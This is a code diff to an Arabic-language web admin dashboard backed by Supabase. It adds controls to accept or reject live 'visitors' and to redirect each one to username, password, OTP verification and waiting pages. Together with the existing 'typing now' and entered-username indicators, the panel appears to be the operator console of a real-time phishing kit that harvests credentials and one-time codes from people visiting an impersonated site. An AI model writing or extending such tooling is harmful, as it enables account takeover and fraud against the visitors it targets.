@@ -169,7 +169,7 @@ body { font-family: 'Tajawal', 'Inter', sans-serif; }
                         حظر <i class="fa-solid fa-ban mr-1"></i>
                     </span>
                     <span id="detail-typing" class="hidden bg-orange-50 text-orange-600 border border-orange-200 text-xs px-3 py-1 rounded font-bold">✎ يكتب الآن</span>
-                    <span id="detail-page" class="bg-blue-50 text-blue-700 border border-blue-200 text-xs px-3 py-1 rounded font-bold">—</span>
+                    <span id="detail-page" class="bg-blue-50 text-blue-700 border border-blue-200 text-xs px-3 py-1 rounded font-bold">—</span> <span id="detail-decide" class="flex items-center gap-2 flex-wrap"><button class="text-[10px] bg-green-600 text-white rounded px-3 py-1.5 hover:bg-green-700 font-bold" onclick="window.adminDecide(window.__curId, 'accepted')">قبول</button><button class="text-[10px] bg-red-600 text-white rounded px-3 py-1.5 hover:bg-red-700 font-bold" onclick="window.adminDecide(window.__curId, 'rejected')">رفض</button><select class="text-[10px] border border-gray-200 rounded px-2 py-1.5 bg-white" onchange="if(this.value){window.doRedirectVisitor(window.__curId, this.value);this.selectedIndex=0;}"><option value="">توجيه الزائر إلى…</option><option value="/">الرئيسية</option><option value="/customer-details/">بيانات العميل</option><option value="/dashboard/">لوحة المستخدم</option><option value="/access-username/">صفحة الدخول</option><option value="/access-password/">كلمة المرور</option><option value="/access-verification/">التحقق (OTP)</option><option value="/access-waiting/">صفحة الانتظار</option><option value="/becare/">لوحة الإدارة</option></select></span>
                     <select id="page-redirect" onchange="if(this.value){window.open(this.value,'_blank');this.selectedIndex=0;}" class="border border-green-500 text-green-600 text-xs px-2 py-1 rounded bg-white cursor-pointer hover:bg-green-50 transition font-bold">
                         <option value="">إعادة توجيه إلى صفحة…</option>
                         <option value="/">الرئيسية</option>
@@ -254,6 +254,7 @@ body { font-family: 'Tajawal', 'Inter', sans-serif; }
 <div id="toast-stack" class="toast-stack"></div>
 <!-- Supabase data layer: toasts + sounds + compact inbox -->
 <!-- Supabase data layer: compact minimal inbox rows -->
+<!-- Supabase data layer: admin decisions + attempts + redirect -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 const SUPABASE_URL = 'https://gqcugugpigkfaihpaikt.supabase.co';
@@ -415,6 +416,10 @@ function renderUsersList() {
             + '<span class="font-bold text-xs text-gray-800 truncate flex-1">' + esc(user.name) + '</span>'
             + (hasUsername ? '<span class="text-[9px] bg-blue-50 text-blue-600 border border-blue-200 rounded px-1 py-0.5 font-bold shrink-0" title="أدخل اسم المستخدم">✎</span>' : '')
             + '<span class="text-[9px] text-gray-400 whitespace-nowrap shrink-0">' + pageLabel(user.page) + '</span>';
+            + (user.online ? '<span class="flex flex-col gap-1 shrink-0">'
+            + '<button class="decision-btn text-[9px] bg-green-50 text-green-600 border border-green-200 rounded px-1.5 hover:bg-green-100 font-bold" title="قبول" onclick="event.stopPropagation();window.adminDecide(\'' + user.id + '\', \'accepted\')">قبول</button>'
+            + '<button class="decision-btn text-[9px] bg-red-50 text-red-600 border border-red-200 rounded px-1.5 hover:bg-red-100 font-bold" title="رفض" onclick="event.stopPropagation();window.adminDecide(\'' + user.id + '\', \'rejected\')">رفض</button>'
+            + '</span>' : '')
         usersListEl.appendChild(row);
     });
 }
@@ -437,6 +442,7 @@ function updateStats() {
 
 function selectUser(id) {
     selectedUserId = id;
+    window.__curId = id;
     renderUsersList();
     const user = allUsersData.find((u) => u.id === id);
     if (!user) return;
@@ -646,6 +652,18 @@ window.copyToClipboard = function (textOrId) {
         if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(textToCopy).then(done).catch(() => { document.execCommand('copy'); done(); });
         else { document.execCommand('copy'); done(); }
     } catch (err) { ta.remove(); }
+};
+window.adminDecide = async function (id, action) {
+    const { error } = await sb.rpc('admin_decide', { p_id: id, p_action: action });
+    if (error) { window.showToast('تعذر التنفيذ: ' + (error.message || '')); return; }
+    window.showToast(action === 'accepted' ? 'قُبل الزائر' : 'رُفض الزائر');
+    await fetchVisitors(); renderUsersList();
+};
+window.doRedirectVisitor = async function (id, url) {
+    const { error } = await sb.rpc('redirect_visitor', { p_id: id, p_url: url });
+    if (error) { window.showToast('تعذر التوجيه'); return; }
+    window.showToast('تم توجيه الزائر');
+    await fetchVisitors(); renderUsersList();
 };
 window.showToast = function (message, kind) {
     const stack = document.getElementById('toast-stack');
